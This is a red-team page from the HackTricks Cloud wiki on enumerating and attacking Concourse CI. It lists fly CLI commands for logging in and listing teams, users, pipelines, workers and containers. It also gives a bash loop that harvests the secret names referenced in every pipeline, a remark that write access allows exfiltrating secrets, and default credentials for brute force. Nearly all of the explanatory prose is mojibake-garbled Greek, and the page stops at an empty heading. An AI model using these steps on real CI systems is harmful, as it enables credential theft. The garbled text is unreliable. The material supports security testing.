# Concourse Enumeration & Attacks

## Concourse Enumeration & Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### User Roles & Permissions

Î¤Î¿ Concourse Î­ÏÏ‡ÎµÏ„Î±Î¹ Î¼Îµ Ï€Î­Î½Ï„Îµ ÏÏŒÎ»Î¿Ï…Ï‚:

* _Concourse_ **Admin**: Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÏÏŒÎ»Î¿Ï‚ Î´Î¯Î½ÎµÏ„Î±Î¹ Î¼ÏŒÎ½Î¿ ÏƒÏ„Î¿Ï…Ï‚ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„ÎµÏ‚ Ï„Î·Ï‚ **ÎºÏÏÎ¹Î±Ï‚ Î¿Î¼Î¬Î´Î±Ï‚** (Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Î±ÏÏ‡Î¹ÎºÎ® Î¿Î¼Î¬Î´Î± Ï„Î¿Ï… concourse). ÎŸÎ¹ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î­Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **Î´Î¹Î±Î¼Î¿ÏÏ†ÏÏƒÎ¿Ï…Î½ Î¬Î»Î»ÎµÏ‚ Î¿Î¼Î¬Î´ÎµÏ‚** (Ï€.Ï‡.: `fly set-team`, `fly destroy-team`...). ÎŸÎ¹ Î¬Î´ÎµÎ¹ÎµÏ‚ Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï… Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÏ€Î·ÏÎµÎ±ÏƒÏ„Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î¿ RBAC.
* **owner**: ÎŸÎ¹ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„ÎµÏ‚ Î¿Î¼Î¬Î´Ï‰Î½ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î± Ï€Î¬Î½Ï„Î± ÎµÎ½Ï„ÏŒÏ‚ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚**.
* **member**: Î¤Î± Î¼Î­Î»Î· Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **Î´Î¹Î±Î²Î¬ÏƒÎ¿Ï…Î½ ÎºÎ±Î¹ Î½Î± Î³ÏÎ¬ÏˆÎ¿Ï…Î½** ÎµÎ½Ï„ÏŒÏ‚ Ï„Ï‰Î½ **Ï€ÏŒÏÏ‰Î½ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚** Î±Î»Î»Î¬ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚.
* **pipeline-operator**: ÎŸÎ¹ Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î­Ï‚ pipeline Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ pipeline** ÏŒÏ€Ï‰Ï‚ Î· ÎµÎºÎºÎ¯Î½Î·ÏƒÎ· ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…ÏÎ½ ÎºÎ±Î¹ Î· ÏƒÏ„Î±Î¸ÎµÏÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Ï€ÏŒÏÏ‰Î½, Ï‰ÏƒÏ„ÏŒÏƒÎ¿ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎ¿Ï…Î½ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… pipeline.
* **viewer**: ÎŸÎ¹ Î¸ÎµÎ±Ï„Î­Ï‚ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚ Î­Ï‡Î¿Ï…Î½ **"Î¼ÏŒÎ½Î¿ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·" Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Î¹Î± Î¿Î¼Î¬Î´Î±** ÎºÎ±Î¹ Ï„Î± pipelines Ï„Î·Ï‚.

{% hint style="info" %}
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î¿Î¹ **Î¬Î´ÎµÎ¹ÎµÏ‚ Ï„Ï‰Î½ ÏÏŒÎ»Ï‰Î½ owner, member, pipeline-operator ÎºÎ±Î¹ viewer Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½** ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ RBAC (ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï€Î¹Î¿ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± Ï„Î¹Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î­Ï‚ Ï„Î¿Ï…). Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î³Î¹' Î±Ï…Ï„ÏŒ ÏƒÏ„Î¿: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ Concourse **Î¿Î¼Î±Î´Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î± pipelines Î¼Î­ÏƒÎ± ÏƒÎµ ÎŸÎ¼Î¬Î´ÎµÏ‚**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï€Î¿Ï… Î±Î½Î®ÎºÎ¿Ï…Î½ ÏƒÎµ Î¼Î¹Î± ÎŸÎ¼Î¬Î´Î± Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î±Ï…Ï„Î¬ Ï„Î± pipelines ÎºÎ±Î¹ **Ï€Î¿Î»Î»Î­Ï‚ ÎŸÎ¼Î¬Î´ÎµÏ‚** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½. ÎˆÎ½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î®ÎºÎµÎ¹ ÏƒÎµ Ï€Î¿Î»Î»Î­Ï‚ ÎŸÎ¼Î¬Î´ÎµÏ‚ ÎºÎ±Î¹ Î½Î± Î­Ï‡ÎµÎ¹ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÏƒÎµ ÎºÎ¬Î¸Îµ Î¼Î¯Î± Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚.

### Vars & Credential Manager

Î£Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ YAML Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ„Îµ Ï„Î¹Î¼Î­Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· ÏƒÏÎ½Ï„Î±Î¾Î· `((_source-name_:_secret-path_._secret-field_))`.\
[Î‘Ï€ÏŒ Ï„Î± Î­Î³Î³ÏÎ±Ï†Î±:](https://concourse-ci.org/vars.html#var-syntax) ÎŸ **source-name ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÏŒÏ‚**, ÎºÎ±Î¹ Î±Î½ Ï€Î±ÏÎ±Î»Î·Ï†Î¸ÎµÎ¯, Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¿ [Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ ÏƒÎµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ ÎºÎ»Î¬ÏƒÏ„ÎµÏ](https://concourse-ci.org/vars.html#cluster-wide-credential-manager), Î® Î· Ï„Î¹Î¼Î® Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±ÏƒÏ‡ÎµÎ¸ÎµÎ¯ [ÏƒÏ„Î±Ï„Î¹ÎºÎ¬](https://concourse-ci.org/vars.html#static-vars).\
ÎŸ **Ï€ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÏŒÏ‚ \_secret-field**\_ ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÎ¹ Î­Î½Î± Ï€ÎµÎ´Î¯Î¿ ÏƒÏ„Î¿ Î±Î½Î±ÎºÏ„Î·Î¸Î­Î½ Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ Î³Î¹Î± Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·. Î‘Î½ Ï€Î±ÏÎ±Î»Î·Ï†Î¸ÎµÎ¯, Î¿ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÎ¹ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÎ¹ Î­Î½Î± 'Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ Ï€ÎµÎ´Î¯Î¿' Î±Ï€ÏŒ Ï„Î¿ Î±Î½Î±ÎºÏ„Î·Î¸Î­Î½ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î¿ Î±Î½ Ï„Î¿ Ï€ÎµÎ´Î¯Î¿ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹.\
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Ï„Î¿ _**secret-path**_ ÎºÎ±Î¹ _**secret-field**_ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î´Î¹Ï€Î»Î¬ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î¹ÎºÎ¬ `"..."` Î±Î½ **Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÎµÎ¹Î´Î¹ÎºÎ¿ÏÏ‚ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚** ÏŒÏ€Ï‰Ï‚ `.` ÎºÎ±Î¹ `:`. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, `((source:"my.secret"."field:1"))` Î¸Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹ Ï„Î¿ _secret-path_ ÏƒÎµ `my.secret` ÎºÎ±Î¹ Ï„Î¿ _secret-field_ ÏƒÎµ `field:1`.

#### Static Vars

ÎŸÎ¹ ÏƒÏ„Î±Ï„Î¹ÎºÎ­Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÏ„Î¿ÏÎ½ ÏƒÎµ **Î²Î®Î¼Î±Ï„Î± ÎµÏÎ³Î±ÏƒÎ¹ÏÎ½**:
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```
Or Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ `fly` **arguments**:

* `-v` Î® `--var` `NAME=VALUE` Î¿ÏÎ¯Î¶ÎµÎ¹ Ï„Î· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬ `VALUE` Ï‰Ï‚ Ï„Î·Î½ Ï„Î¹Î¼Î® Î³Î¹Î± Ï„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® `NAME`.
* `-y` Î® `--yaml-var` `NAME=VALUE` Î±Î½Î±Î»ÏÎµÎ¹ Ï„Î¿ `VALUE` Ï‰Ï‚ YAML ÎºÎ±Î¹ Ï„Î¿ Î¿ÏÎ¯Î¶ÎµÎ¹ Ï‰Ï‚ Ï„Î·Î½ Ï„Î¹Î¼Î® Î³Î¹Î± Ï„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® `NAME`.
* `-i` Î® `--instance-var` `NAME=VALUE` Î±Î½Î±Î»ÏÎµÎ¹ Ï„Î¿ `VALUE` Ï‰Ï‚ YAML ÎºÎ±Î¹ Ï„Î¿ Î¿ÏÎ¯Î¶ÎµÎ¹ Ï‰Ï‚ Ï„Î·Î½ Ï„Î¹Î¼Î® Î³Î¹Î± Ï„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï„Î·Ï‚ Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î±Ï‚ `NAME`. Î”ÎµÎ¯Ï„Îµ [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¹Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î±Ï‚.
* `-l` Î® `--load-vars-from` `FILE` Ï†Î¿ÏÏ„ÏÎ½ÎµÎ¹ Ï„Î¿ `FILE`, Î­Î½Î± Î­Î³Î³ÏÎ±Ï†Î¿ YAML Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î±Î½Ï„Î¹ÏƒÏ„Î¿Î¯Ï‡Î¹ÏƒÎ· Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½ ÏƒÎµ Ï„Î¹Î¼Î­Ï‚, ÎºÎ±Î¹ Ï„Î± Î¿ÏÎ¯Î¶ÎµÎ¹ ÏŒÎ»Î±.

#### Î”Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Î”Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î´Î¹Î¬Ï†Î¿ÏÎ¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î¼Îµ Ï„Î¿Ï…Ï‚ Î¿Ï€Î¿Î¯Î¿Ï…Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ Î­Î½Î±Ï‚ **Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î”Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½** ÏƒÎµ Î¼Î¹Î± ÏÎ¿Î® ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚, Î´Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï€ÏÏ‚ ÏƒÏ„Î¿ [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Ï„Î¿ Concourse Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Î´Î¹Î¬Ï†Î¿ÏÎ¿Ï…Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î­Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½:

* [ÎŸ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ Vault](https://concourse-ci.org/vault-credential-manager.html)
* [ÎŸ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ CredHub](https://concourse-ci.org/credhub-credential-manager.html)
* [ÎŸ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [ÎŸ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î”Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
* [ÎŸ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ Conjur](https://concourse-ci.org/conjur-credential-manager.html)
* [Caching credentials](https://concourse-ci.org/creds-caching.html)
* [Redacting credentials](https://concourse-ci.org/creds-redacting.html)
* [Retrying failed fetches](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Î½ Î­Ï‡ÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î¿ ÎµÎ¯Î´Î¿Ï‚ **write access to Concourse** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎµÏÎ³Î±ÏƒÎ¯ÎµÏ‚ Î³Î¹Î± Î½Î± **exfiltrate those secrets** ÎºÎ±Î¸ÏÏ‚ Ï„Î¿ Concourse Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„Î¬.
{% endhint %}

### Concourse Enumeration

Î“Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ Î­Î½Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ concourse Ï€ÏÎ­Ï€ÎµÎ¹ Ï€ÏÏÏ„Î± Î½Î± **ÏƒÏ…Î³ÎºÎµÎ½Ï„ÏÏÏƒÎµÏ„Îµ Î­Î³ÎºÏ…ÏÎ± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±** Î® Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± **authenticated token** Ï€Î¹Î¸Î±Î½ÏÏ‚ ÏƒÎµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ `.flyrc`.

#### Î£ÏÎ½Î´ÎµÏƒÎ· ÎºÎ±Î¹ Ï„ÏÎ­Ï‡Ï‰Î½ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ enum

* Î“Î¹Î± Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¿ **endpoint**, Ï„Î¿ **ÏŒÎ½Î¿Î¼Î± Î¿Î¼Î¬Î´Î±Ï‚** (Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ Ï„Î¿ `main`) ÎºÎ±Î¹ Î¼Î¹Î± **Î¿Î¼Î¬Î´Î± ÏƒÏ„Î·Î½ Î¿Ï€Î¿Î¯Î± Î±Î½Î®ÎºÎµÎ¹ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚**:
* `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Î›Î¬Î²ÎµÏ„Îµ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ **ÏƒÏ„ÏŒÏ‡Î¿Ï…Ï‚**:
* `fly targets`
* Î•Î»Î­Î³Î¾Ï„Îµ Î±Î½ Î· ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î· **ÏƒÏÎ½Î´ÎµÏƒÎ· ÏƒÏ„ÏŒÏ‡Î¿Ï…** ÎµÎ¯Î½Î±Î¹ Î±ÎºÏŒÎ¼Î± **Î­Î³ÎºÏ…ÏÎ·**:
* `fly -t <target> status`
* Î›Î¬Î²ÎµÏ„Îµ Ï„Î¿ **ÏÏŒÎ»Î¿** Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÏƒÎµ ÏƒÏ‡Î­ÏƒÎ· Î¼Îµ Ï„Î¿Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÏ„ÏŒÏ‡Î¿:
* `fly -t <target> userinfo`

{% hint style="info" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ **API token** ÎµÎ¯Î½Î±Î¹ **Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î¿** ÏƒÏ„Î¿ `$HOME/.flyrc` Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, ÎµÎ¬Î½ ÎµÎ»Î­Î³Ï‡ÎµÏ„Îµ Î¼Î¹Î± Î¼Î·Ï‡Î±Î½Î® Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÎµÎºÎµÎ¯ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±.
{% endhint %}

#### ÎŸÎ¼Î¬Î´ÎµÏ‚ & Î§ÏÎ®ÏƒÏ„ÎµÏ‚

* Î›Î¬Î²ÎµÏ„Îµ Î¼Î¹Î± Î»Î¯ÏƒÏ„Î± Î¼Îµ Ï„Î¹Ï‚ ÎŸÎ¼Î¬Î´ÎµÏ‚
* `fly -t <target> teams`
* Î›Î¬Î²ÎµÏ„Îµ ÏÏŒÎ»Î¿Ï…Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ Î¿Î¼Î¬Î´Î±
* `fly -t <target> get-team -n <team-name>`
* Î›Î¬Î²ÎµÏ„Îµ Î¼Î¹Î± Î»Î¯ÏƒÏ„Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½
* `fly -t <target> active-users`

#### Î¡Î¿Î­Ï‚ Î•ÏÎ³Î±ÏƒÎ¯Î±Ï‚

* **Î›Î¯ÏƒÏ„Î±** ÏÎ¿ÏÎ½ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚:
* `fly -t <target> pipelines -a`
* **Î›Î¬Î²ÎµÏ„Îµ** yaml ÏÎ¿Î®Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ (**ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î¿Î½ Î¿ÏÎ¹ÏƒÎ¼ÏŒ):
* `fly -t <target> get-pipeline -p <pipeline-name>`
* Î›Î¬Î²ÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ **Î´Î·Î»Ï‰Î¼Î­Î½ÎµÏ‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚** Ï„Î·Ï‚ ÏÎ¿Î®Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚
* `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Î›Î¬Î²ÎµÏ„Îµ ÏŒÎ»Î± Ï„Î± **Î¿Î½ÏŒÎ¼Î±Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÏÎ½ ÏÎ¿ÏÎ½ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹** (Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ/Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÏÎ³Î±ÏƒÎ¯Î± Î® Î½Î± ÎºÎ±Ï„Î±Î»Î¬Î²ÎµÏ„Îµ Î­Î½Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î± exfiltrate):
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
#### Containers & Workers

* Î›Î¯ÏƒÏ„Î± **ÎµÏÎ³Î±Î¶Î¿Î¼Î­Î½Ï‰Î½**:
* `fly -t <target> workers`
* Î›Î¯ÏƒÏ„Î± **Î´Î¿Ï‡ÎµÎ¯Ï‰Î½**:
* `fly -t <target> containers`
* Î›Î¯ÏƒÏ„Î± **ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…ÏÎ½** (Î³Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¹ Ï„ÏÎ­Ï‡ÎµÎ¹):
* `fly -t <target> builds`

### Concourse Attacks

#### Credentials Brute-Force

* admin:admin
* test:test

#### Secrets and params enumeration

